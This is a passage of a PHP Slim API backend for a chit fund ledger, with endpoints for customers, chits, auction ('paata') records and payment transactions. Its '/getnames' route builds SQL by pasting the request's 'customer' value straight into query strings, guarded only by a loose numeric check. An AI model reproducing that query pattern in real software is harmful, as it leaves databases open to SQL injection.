		//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

		$response["creditors"] = $creditors;
		$response["message"] = "Woot!,Successfully retreived the Creditors list";


		echoRespnse(200, $response);

	}
});


//end creditors


//start
$app->post('/cfcustomer', function () use ($app) {

	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('fname'));
	$Customer = array();
	$Customer["fname"] = postParams($app->request->post('fname'));
	$Customer["lname"] = postParams($app->request->post('lname'));
	$Customer["phone"] = postParams($app->request->post("phone"));
	$Customer["first"] = postParams($app->request->post("first"));
	$Customer["firstid"] = postParams($app->request->post("firstid"));

	$db = new DbHandler();


	$getdata = array();
	$params = $db->getFunctionParam("cfcustomers");
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$customerList = call_user_func_array(array($db, 'getCfCustomers'), $getdata);
	$outputfields = array("id", "fname", "lname", "phone", "first", "firstid", "created", "updated");
	$qryfields = array("id", "fname", "lname", "phone", "first", "firstid", "created", "updated");
	$oldcustomer = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($customerList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($customerList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $customerList[$i][$outputfields[$j]];
			}
		}
		array_push($oldcustomer, $tmp);

	}

	for ($i = 0; $i < sizeof($oldcustomer); $i++) {
		// echo json_encode(strtolower($Customer["fname"]));echo "-->"; echo json_encode($Customer["phone"]);
		if (strtolower($oldcustomer[$i]["fname"]) == strtolower($Customer["fname"]) && strtolower($oldcustomer[$i]["lname"]) == strtolower($Customer["lname"])) {
			$response["error"] = true;
			$response["status"] = "error";
			$response["samecus"] = 1;
			$response["message"] = "Oops! Already Customer with same name exist";

			echoRespnse(200, $response);
			return;
		}
	}
	// echo "hiiidone";
	$createCfCustomerstatus = $db->createCfCustomer($Customer);

	if ($createCfCustomerstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Customer";
		$response["err"] = $createCfCustomerstatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createCfCustomerstatus['id'];
		$response["message"] = "Woot!,Successfully created Customer with id " . $createCfCustomerstatus['id'];
	}

	echoRespnse(200, $response);
});


$app->get('/cfcustomers', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("cfcustomers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$customerList = call_user_func_array(array($db, 'getCfCustomers'), $getdata);
	$outputfields = array("id", "fname", "lname", "phone", "first", "firstid", "firstidname", "created", "updated");
	$qryfields = array("id", "fname", "lname", "phone", "first", "firstid", "firstidname", "created", "updated");
	$cfcustomers = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($customerList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($customerList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $customerList[$i][$outputfields[$j]];
			}
		}
		array_push($cfcustomers, $tmp);

	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];

	$response["cfcustomers"] = $cfcustomers;
	$response["message"] = "Woot!,Successfully retreived the Chitfund customer list";


	echoRespnse(200, $response);

});


$app->get('/cfcustomer/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("cfcustomers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$customerList = call_user_func_array(array($db, 'getCfCustomers'), $getdata);
	$outputfields = array("id", "fname", "lname", "phone", "first", "firstid", "firstidname", "created", "updated"); //db
	$qryfields = array("id", "fname", "lname", "phone", "first", "firstid", "firstidname", "created", "updated");
	// $customer=array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($customerList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($customerList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $customerList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//array_push($customer,$tmp);
	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["cfcustomer"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Chitfund customer list";


	echoRespnse(200, $response);

});

$app->put('/cfcustomer/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("cfcustomers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$customerDetail = call_user_func_array(array($db, 'getCfCustomers'), $getdata);
	if (sizeOf($customerDetail) > 0) {
		$params = $db->putFunctionParam("cfcustomers");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editCfCustomer'), $putdata);
		// echo json_encode($editDetail);
		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Customer information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Customer information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Customer found with given ID";
	}
	echoRespnse(200, $response);
});



$app->get('/cfchiti', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("cfchiti");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {

		if (getParams($app->request->get($params[$i])) || (gettype($app->request->get($params[$i])) == "string" && $app->request->get($params[$i]) == "0")) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$cfchitiList = call_user_func_array(array($db, 'getCfChiti'), $getdata);
	$cfchiti = array();

	$outputfields = array("id", "date", "chitiname", "code", "no", "amount", "created", "updated");
	$qryfields = array("id", "date", "chitiname", "code", "no", "amount", "created", "updated");
	for ($i = 0; $i < sizeof($cfchitiList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($cfchitiList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $cfchitiList[$i][$qryfields[$j]];
			}
		}
		array_push($cfchiti, $tmp);
	}
	$response["error"] = "false";
	$response["status"] = "success";
	$response["cfchiti"] = $cfchiti;
	$response["message"] = "Woot ! successfully retreived the Chit Fund Chiti List";
	echoRespnse(200, $response);

});


$app->post('/cfchiticustomers', function () use ($app) {

	$r = json_decode($app->request->getBody());
	// verifyRequiredParams(array('fname'));

	$cfchiticustomers = array();
	$cfchiticustomers = postParams($app->request->post('cfchiticustomers'));

	$db = new DbHandler();
	for ($i = 0; $i < sizeof($cfchiticustomers); $i++) {
		$cfchiticustomerstatus = $db->createCfChitiCustomer($cfchiticustomers[$i]);
	}
	// echo json_encode($customer);

	if ($cfchiticustomerstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating customer";
		$response["err"] = $cfchiticustomerstatus;
	} else {
		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $cfchiticustomerstatus['id'];
		$response["message"] = "Woot!,Successfully created Customer";
	}

	echoRespnse(200, $response);
});


$app->get('/cfchiticustomers', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("cfchiticustomers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i])) || (gettype($app->request->get($params[$i])) == "string" && $app->request->get($params[$i]) == "0")) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$cfchiticustomersList = call_user_func_array(array($db, 'getCfChitiCustomers'), $getdata);
	$cfchiticustomers = array();
	$outputfields = array("id", "chiti", "chitiname", "code", "customer", "customername", "cusno", "created", "updated");
	$qryfields = array("id", "chiti", "chitiname", "code", "customer", "customername", "cusno", "created", "updated");
	for ($i = 0; $i < sizeof($cfchiticustomersList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($cfchiticustomersList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $cfchiticustomersList[$i][$qryfields[$j]];
			}
		}
		array_push($cfchiticustomers, $tmp);
	}
	$response["error"] = "false";
	$response["status"] = "success";
	$response["cfchiticustomers"] = $cfchiticustomers;
	$response["message"] = "Woot ! successfully retreived the cfchiticustomers List";
	echoRespnse(200, $response);

});


$app->put('/cfchiticustomers/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("cfchiticustomers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$customerDetail = call_user_func_array(array($db, 'getCfChitiCustomers'), $getdata);
	if (sizeOf($customerDetail) > 0) {
		$params = $db->putFunctionParam("cfchiticustomers");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editCfChitiCustomer'), $putdata);

		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Customer information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Customer information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Customer found with given ID";
	}
	echoRespnse(200, $response);
});



$app->post('/cfpaata', function () use ($app) {

	$r = json_decode($app->request->getBody());
	// verifyRequiredParams(array('fname'));
	$paata = array();
	$paata["date"] = postParams($app->request->post('date'));
	$paata["chiti"] = postParams($app->request->post('chiti'));
	$paata["no"] = postParams($app->request->post("no"));
	$paata["customer"] = postParams($app->request->post("customer"));
	$paata["paata"] = postParams($app->request->post("paata"));
	$paata["payamount"] = postParams($app->request->post("payamount"));
	$paata["repayamount"] = postParams($app->request->post("repayamount"));
	$paata["sripalcomm"] = postParams($app->request->post("sripalcomm"));
	$paata["sowjicomm"] = postParams($app->request->post("sowjicomm"));

	$db = new DbHandler();

	// echo json_encode($paata);
	$createCfPaatastatus = $db->createCfPaata($paata);

	if ($createCfPaatastatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Paata";
		$response["err"] = $createCfPaatastatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createCfPaatastatus['id'];
		$response["message"] = "Woot!,Successfully created Paata with id " . $createCfPaatastatus['id'];
	}

	echoRespnse(200, $response);
});

$app->get('/cfpaata', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("cfpaata");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i])) || (gettype($app->request->get($params[$i])) == "string" && $app->request->get($params[$i]) == "0")) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$cfpaataList = call_user_func_array(array($db, 'getCfPaata'), $getdata);
	$cfpaata = array();

	$outputfields = array("id", "date", "chiti", "chitiname", "code", "no", "customer", "customername", "cusno", "paata", "payamount", "repayamount", "sripalcomm", "sowjicomm", "created", "updated");
	$qryfields = array("id", "date", "chiti", "chitiname", "code", "no", "customer", "customername", "cusno", "paata", "payamount", "repayamount", "sripalcomm", "sowjicomm", "created", "updated");
	for ($i = 0; $i < sizeof($cfpaataList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($cfpaataList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $cfpaataList[$i][$qryfields[$j]];
			}
		}
		array_push($cfpaata, $tmp);
	}
	$response["error"] = "false";
	$response["status"] = "success";
	$response["cfpaata"] = $cfpaata;
	$response["message"] = "Woot ! successfully retreived the cfpaata List";
	echoRespnse(200, $response);

});

$app->get('/cfpaata/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("cfpaata");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cfpaataList = call_user_func_array(array($db, 'getCfPaata'), $getdata);
	$outputfields = array("id", "date", "chiti", "chitiname", "code", "no", "customer", "customername", "cusno", "paata", "payamount", "repayamount", "sripalcomm", "sowjicomm", "created", "updated"); //db
	$qryfields = array("id", "date", "chiti", "chitiname", "code", "no", "customer", "customername", "cusno", "paata", "payamount", "repayamount", "sripalcomm", "sowjicomm", "created", "updated");
	$cfpaata = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($cfpaataList); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($cfpaataList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $cfpaataList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//	array_push($cfpaata,$tmp);

	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcfpaatas'), $getdata)[0]["count(*)"];
	$response["cfpaata"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the cfpaata list";


	echoRespnse(200, $response);

});



$app->put('/cfpaata/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("cfpaata");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cfpaataDetail = call_user_func_array(array($db, 'getCfPaata'), $getdata);
	if (sizeOf($cfpaataDetail) > 0) {
		$params = $db->putFunctionParam("cfpaata");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editCfPaata'), $putdata);
		// echo ($editDetail);

		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited cfpaata information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing cfpaata information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No cfpaata found with given ID";
	}
	echoRespnse(200, $response);
});

//start

$app->post('/cftrans', function () use ($app) {

	$r = json_decode($app->request->getBody());
	// verifyRequiredParams(array('fname'));
	$cftrans = array();
	$cftrans["date"] = postParams($app->request->post('date'));
	$cftrans["chiti"] = postParams($app->request->post('chiti'));
	$cftrans["paata"] = postParams($app->request->post("paata"));
	$cftrans["customer"] = postParams($app->request->post("customer"));
	$cftrans["debit"] = postParams($app->request->post("debit"));
	$cftrans["credit"] = postParams($app->request->post("credit"));
	$cftrans["paymentmode"] = postParams($app->request->post("paymentmode"));
	$cftrans["pmid"] = 0;
	$cftrans["pmtrans"] = postParams($app->request->post("pmtrans"));
	$cftrans["note"] = postParams($app->request->post("note"));

	$db = new DbHandler();

	// echo json_encode($cftrans);
	$createCfTransstatus = $db->createCfTrans($cftrans);

	if ($createCfTransstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Cf Trans";
		$response["err"] = $createCfTransstatus;
	} else {
		if ($cftrans["paymentmode"] == 50 && sizeof($cftrans["pmtrans"])) {
			$pmtransids = array();
			for ($k = 0; $k < sizeof($cftrans["pmtrans"]); $k++) {
				if ($cftrans["pmtrans"][$k]["paymentmode"]) {
					$pmtrans = array();
					$pmtrans["date"] = $cftrans["date"];
					$pmtrans["tablename"] = "cftrans";
					$pmtrans["tableid"] = $createCfTransstatus['id'];
					$pmtrans["paymentmode"] = $cftrans["pmtrans"][$k]["paymentmode"];
					$pmtrans["credit"] = $cftrans["pmtrans"][$k]["credit"];
					$pmtrans["debit"] = $cftrans["pmtrans"][$k]["debit"];
					$createpmtransstatus = $db->createPmTrans($pmtrans);
					// echo "pmtrans_status".json_encode($createcftransStatus);
					if ($createpmtransstatus['status'] == SUCCESS) {
						array_push($pmtransids, $createpmtransstatus['id']);
					}
				} else {
					$response["error"] = true;
					$response["status"] = "error";
					$response["message"] = "Oops! An error occurred while creating Cf Trans";
					$response["err"] = $createCfTransstatus;
					echoRespnse(200, $response);
					return;
				}
			}
			// echo json_encode($pmtransids);
			if (sizeof($pmtransids) > 0) {
				$params = $db->putFunctionParam("cftrans");
				$updateField = array();
				$updateField["id"] = $createCfTransstatus['id'];
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					if ($params[$i] == "pmid") {
						array_push($putdata, implode(',', $pmtransids));
					} else {
						array_push($putdata, "");
					}
				}
				array_push($putdata, "");

				// echo json_encode($putdata);
				$editcfDetail = call_user_func_array(array($db, 'editCfTrans'), $putdata);
				// echo json_encode($editcfDetail);
			}
		}
	}
	$response["error"] = false;
	$response["status"] = "success";
	$response["samecus"] = 0;
	$response["id"] = $createCfTransstatus['id'];
	$response["message"] = "Woot!,Successfully created Cf Trans with id " . $createCfTransstatus['id'];
	// }

	echoRespnse(200, $response);
});

$app->get('/cftrans', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("cftrans");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i])) || (gettype($app->request->get($params[$i])) == "string" && $app->request->get($params[$i]) == "0")) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$cftransList = call_user_func_array(array($db, 'getCfTrans'), $getdata);
	$cftrans = array();

	$outputfields = array("id", "date", "chiti", "chitiname", "code", "paata", "paataamt", "customer", "customername", "cusno", "maincus", "debit", "credit", "paymentmode", "pmid", "note", "payamount", "repayamount", "paatano", "created", "updated");
	$qryfields = array("id", "date", "chiti", "chitiname", "code", "paata", "paataamt", "customer", "customername", "cusno", "maincus", "debit", "credit", "paymentmode", "pmid", "note", "payamount", "repayamount", "paatano", "created", "updated");

	for ($i = 0; $i < sizeof($cftransList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($cftransList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $cftransList[$i][$qryfields[$j]];
			}
		}

		$tmp["pmtrans"] = array();
		if ($tmp["paymentmode"] == 50) {
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "tableid") {
					array_push($getpmdata, $tmp["id"]);
				} else if ($params[$m] == "tablename") {
					array_push($getpmdata, "cftrans");
				} else {
					array_push($getpmdata, "");
				}
			}
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
		}

		array_push($cftrans, $tmp);
	}
	$response["error"] = "false";
	$response["status"] = "success";
	$response["cftrans"] = $cftrans;
	$response["message"] = "Woot ! successfully retreived the cftrans List";
	echoRespnse(200, $response);

});

$app->get('/cftrans/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("cftrans");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cftransList = call_user_func_array(array($db, 'getCfTrans'), $getdata);
	$outputfields = array("id", "date", "chiti", "chitiname", "code", "paata", "paataamt", "customer", "customername", "cusno", "maincus", "debit", "credit", "paymentmode", "pmid", "note", "payamount", "repayamount", "paatano", "created", "updated"); //db
	$qryfields = array("id", "date", "chiti", "chitiname", "code", "paata", "paataamt", "customer", "customername", "cusno", "maincus", "debit", "credit", "paymentmode", "pmid", "note", "payamount", "repayamount", "paatano", "created", "updated");
	// $cftrans=array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($cftransList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($cftransList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $cftransList[$i][$outputfields[$j]];
			}
		}
		// echo json_encode($tmp)."<----";
		$tmp["pmtrans"] = array();
		if ($tmp["paymentmode"] == 50 && $tmp["pmid"]) {
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			// echo json_encode($params);
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "tableid") {
					array_push($getpmdata, $tmp["id"]);
				} else if ($params[$m] == "tablename") {
					array_push($getpmdata, "cftrans");
				} else {
					array_push($getpmdata, "");
				}
			}
			// echo json_encode($tmp)."<2----";
			// echo json_encode($getpmdata);
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
			// echo json_encode($tmp)."<3----";

		}

		//	array_push($cftrans,$tmp);
	}
	// echo json_encode($tmp)."<-------";

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcftranss'), $getdata)[0]["count(*)"];
	$response["cftrans"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the cftrans list";


	echoRespnse(200, $response);

});



$app->put('/cftrans/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$datechanged = false;
	$params = $db->getFunctionParam("cftrans");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cftransDetail = call_user_func_array(array($db, 'getCfTrans'), $getdata);
	if (sizeOf($cftransDetail) > 0) {

		$delallpmTrans = false;
		if ($cftransDetail[0]["paymentmode"] == 50 && putParam($r, "paymentmode") != 50) {
			$delallpmTrans = true;
		}

		if ($cftransDetail[0]["date"] != putParam($r, "date")) {
			$datechanged = true;
		}

		$params = $db->putFunctionParam("cftrans");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editCfTrans'), $putdata);
		// echo ($editDetail);

		if ($editDetail) { //if error occurs while creating product
			if (putParam($r, "paymentmode") == 50 && putParam($r, "pmtrans")) {
				$pmtrans = putParam($r, "pmtrans");
				if ($datechanged) {
					for ($b = 0; $b < sizeof($pmtrans); $b++) {
						$pmtrans[$b]->date = putParam($r, "date");
					}
				}
				$opParam = "pmtrans";
				$mainId = "tableid";
				$outputfields = array("date", "tablename", "tableid", "paymentmode", "credit", "debit", "created", "updated");
				$getFunction = "getPmTrans";
				$syncdata = $pmtrans;
				$putFunction = "editPmTrans";
				$tablename = "cftrans";
				$syncData = updateTable($db, $opParam, $mainId, $outputfields, $getFunction, $syncdata, $putFunction, $id, $tablename, explode(",", $cftransDetail[0]["pmid"]));


				if ($syncData && sizeof($syncData) > 0) {
					$pmid = array();
					for ($i = 0; $i < sizeof($syncData); $i++) {
						// $syncData[$i]["date"] = $id;
						$syncData[$i]["date"] = ($datechanged) ? putParam($r, "date") : $cftransDetail[0]["date"];

						$syncData[$i]["tableid"] = $id;
						$syncData[$i]["tablename"] = "cftrans";
						$createpmtransstatus = $db->createPmTrans($syncData[$i]);
						// array_push($tmp,$syncData[$i]["no"]);
						array_push($pmid, $createpmtransstatus['id']);
					}

					if ($pmid && sizeof($pmid) > 0) {
						$params = $db->getFunctionParam("cftrans");
						$getdata = array();
						for ($i = 0; $i < sizeof($params); $i++) {
							if ($params[$i] == "id") {
								array_push($getdata, $id);
							} else {
								array_push($getdata, "");
							}
						}
						$cftransDetail1 = call_user_func_array(array($db, 'getCfTrans'), $getdata);
						// echo " 2- ".json_encode($cftransDetail1[0]["pmid"]);
						if (sizeOf($cftransDetail1) > 0) {
							$params = $db->putFunctionParam("cftrans");
							$updateField = array();
							$updateField["id"] = $id;
							$putdata = array();
							array_push($putdata, $updateField);
							for ($i = 0; $i < sizeof($params); $i++) {
								if ($params[$i] == "pmid") {
									// echo "size".strlen($cftransDetail1[0]["pmid"]);
									if (strlen(trim($cftransDetail1[0]["pmid"])) > 0) {
										$tempstr = "";
										$tempstr = strval($cftransDetail1[0]["pmid"]) . ',' . strval(implode(',', $pmid));
										array_push($putdata, $tempstr);
										// echo " 2.1- ".$tempstr;
									} else {
										array_push($putdata, implode(',', $pmid));
										// echo " 2.2- ".implode(',', $pmid);
									}
								} else {
									array_push($putdata, "");
								}
							}
							array_push($putdata, "");
							// echo " 3- ".json_encode($putdata);
							$editDetail = call_user_func_array(array($db, 'editCfTrans'), $putdata);

						}
					}

				}
			}

			if ($delallpmTrans) {
				$params = $db->putFunctionParam("pmtrans");
				$updateField = array();
				$updateField["tablename"] = "cftrans";
				$updateField["tableid"] = $id;
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					array_push($putdata, "");
				}
				array_push($putdata, "1");

				$editpmtransDetail = call_user_func_array(array($db, 'editPmTrans'), $putdata);

			}
			// }
			// }

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited cftrans information";

		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing cftrans information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No cftrans found with given ID";
	}
	echoRespnse(200, $response);
});


$app->get('/getnames', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$customer = $app->request->get("customer");
	if ($customer > 0) {
		// echo "SELECT DISTINCT(chiti),b.chitiname as chitiname,b.code as code FROM `cfchiticustomers` a LEFT JOIN cfchiti b on a.chiti=b.id where customer = '$customer'";
		$chitinames = $db->getmultiRecord("SELECT DISTINCT(chiti) , b.chitiname as chitiname,b.code as code FROM `cfchiticustomers` a LEFT JOIN cfchiti b on a.chiti=b.id where customer = '$customer'");

		$secondcustomers = $db->getmultiRecord("SELECT id FROM `cfcustomers` WHERE firstid = '$customer'");
		if (sizeof($secondcustomers)) {
			$tmp = array();
			for ($t = 0; $t < sizeof($secondcustomers); $t++) {
				array_push($tmp, $secondcustomers[$t]["id"]);
			}
			$customer = "";
			$customer = implode(',', $tmp);
			// echo "hi";
			$customernames = $db->getmultiRecord("SELECT DISTINCT(customer + cusno), CONCAT(b.fname,' ' ,b.lname) as customername, a.cusno as cusno  FROM `cfchiticustomers` a LEFT JOIN cfcustomers b on a.customer=b.id WHERE customer IN ($customer)");
		} else {
			$customernames = $db->getmultiRecord("SELECT DISTINCT(customer + cusno), CONCAT(b.fname,' ' ,b.lname) as customername, a.cusno as cusno  FROM `cfchiticustomers` a LEFT JOIN cfcustomers b on a.customer=b.id WHERE customer = '$customer'");
		}
		// echo $customer;
		// echo "SELECT DISTINCT(customer + cusno), CONCAT(b.fname,' ' ,b.lname) as customername, a.cusno as cusno  FROM `cfchiticustomers` a LEFT JOIN cfcustomers b on a.customer=b.id WHERE customer = '$customer'";
		// echo json_encode($customernames);	
		$response["error"] = false;
		$response['status'] = "success";
		$response["chitinames"] = $chitinames;
		$response["customernames"] = $customernames;
		$response["message"] = "Woot!,Successfully retreived the Names list";
	} else {
		$response["error"] = true;
		$response['status'] = "error";
